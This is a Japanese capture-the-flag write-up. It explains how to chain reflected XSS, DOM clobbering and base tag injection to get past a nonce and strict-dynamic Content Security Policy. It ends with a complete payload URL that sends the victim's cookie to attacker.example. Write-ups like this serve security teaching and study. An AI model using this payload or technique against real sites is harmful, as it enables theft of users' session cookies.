# Writeup

## 方針

この問題は Admin のクローラの Cookie 中にフラグが保持されることから、XSS 問題であることが察される。
また CSP が以下のような PHP コードにより設定されている。

```php
$nonce = base64_encode(random_bytes(20));
header("Content-Security-Policy: default-src 'none'; script-src 'nonce-${nonce}' 'strict-dynamic' 'sha256-nus+LGcHkEgf6BITG7CKrSgUIb1qMexlF8e5Iwx1L2A='");
```

この CSP の場合、せいぜい攻撃可能性が生まれるとしたら、`strict-dynamic` のせいであろう。

## 脆弱性

ページ中には以下のようなコード片が存在する。
ここには明らかな Reflected XSS 脆弱性が存在する。

```php
    <title>Best somen for <?= isset($_GET["username"]) ? $_GET["username"] : "You" ?></title>
```

また以下の箇所にも `innerHTML` への代入があり、かつ代入値は URL 中のクエリパラメータから来ているため、ここには DOM-based XSS 脆弱性がありそうだ。

```html
<script nonce=" <?= $nonce ?>">
    const choice = l => l[Math.floor(Math.random() * l.length)];

    window.onload = () => {
        const username = new URL(location).searchParams.get("username");
        const adjective = choice(["Nagashi", "Hiyashi"]);
        if (username !== null)
            document.getElementById("message").innerHTML = `${username}, I recommend ${adjective} somen for you :-P`;
    }
</script>
```

## 方針

CSP の制限により、インラインのコード実行はできない。
なので `<title>` タグ内の Reflected XSS から有効な `<script>` を挿入するのは難しそうである。

しかし DOM-based XSS については、`strict-dynamic` が指定されている今回の場合において、次の条件を満たせるなら任意 JavaScript 実行に繋げられる。

- 条件 1: `document.getElementById("message")` が `<script>` タグを指している。
- 条件 2: クエリパラメータの `username` に実行したい JavaScript が自由に指定できる。

## 条件 1

これは愚直には満たされていない条件だが、DOM Clobbering により解決できる。
クエリパラメータ `username` の値に `<script id=message></script>` を含めておけば、これが `<title>` タグ内の Reflected XSS 経由でページ中に挿入され、`document.getElementById("message")` が `<script>` タグを指すようになるためである。

## 条件 2

いまページ中でロードされている `/security.js` は次のような JavaScript コードである。

```js
console.log('!! security.js !!');
const username = new URL(location).searchParams.get("username");
if (username !== null && ! /^[a-zA-Z0-9]*$/.test(username)) {
    document.location = "/error.php";
}
```

これらには HTML タグの挿入や JavaScript の実行に繋がりそうなコード片が含まれていない。
むしろ GET パラメータ中の `username` `[a-zA-Z0-9]` 以外の文字が存在した場合、リダイレクトを起こしてしまう。
この挙動により、愚直には条件 2 を満たせない。

しかしこれは base tag injection により解決することができる。
クエリパラメータ `username` の値に以下のような `<base>` タグを含めておけば、これが `<title>` タグ内の Reflected XSS 経由でページ中に挿入され、その後にロードされる `/security.js` の読み出し元が `http://hoge.example/security.js` となり、上記の JavaScript コードがロードされなくなるからである。

```html
</title><base href="http://hoge.example">
```

## 解答

このように DOM Clobbering + base tag injection を組み合わせることで、任意の JavaScript 実行が達成できる。

例えば次のような URL にアクセスすると、Cookie の値が `http://attacker.example` に送信される。

```
https://ホスト名/?username=document.location=`http://attacker.example/?q=${encodeURIComponent(document.cookie)}`;%20//%20%3C/title%3E%3Cscript%20id=%22message%22%3E%3C/script%3E%3Cbase%20href=%22http://example.com%22%3E
```

URL エンコードされていると分かりにくいが、具体的には次のような値がクエリパラメータ `username` に指定されている。

```html
document.location=`http://attacker.example/?q=${encodeURIComponent(document.cookie)}`;// </title><script id=message></script><base href="http://hoge.example">
```